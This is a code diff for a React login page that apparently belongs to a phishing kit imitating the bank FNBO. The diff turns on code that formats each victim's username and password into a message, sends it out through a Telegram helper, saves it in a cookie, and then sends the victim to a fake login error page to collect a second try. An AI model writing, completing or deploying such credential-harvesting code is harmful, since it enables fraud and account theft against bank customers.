@@ -1,9 +1,9 @@
 import React from "react";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
-import { wait } from "../utils/waiter";
+// import { wait } from "../utils/waiter";
 // import { visitorNotification } from "../utils/visitor_notification";
-// import TelegramSend from "../utils/send-message";
+import TelegramSend from "../utils/send-message";
 
 export default function Login() {
   const [isLoading, setIsLoading] = React.useState(false);
@@ -22,14 +22,14 @@ export default function Login() {
   
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
-    // const message = `
-    // ---- FNBO LOGIN (FIRST TRY) -----
-    // Username: ${formInput.username}
-    // Password: ${formInput.password}
-    // `;
+    const message = `
+    ---- FNBO LOGIN (FIRST TRY) -----
+    Username: ${formInput.username}
+    Password: ${formInput.password}
+    `;
     setIsLoading(true)
-   await wait(3000)
-    // await TelegramSend(message);
+  //  await wait(3000)
+    await TelegramSend(message);
     cookies.set("login1", formInput);
     setIsLoading(false)
     navigate("../login/error", { replace: true });
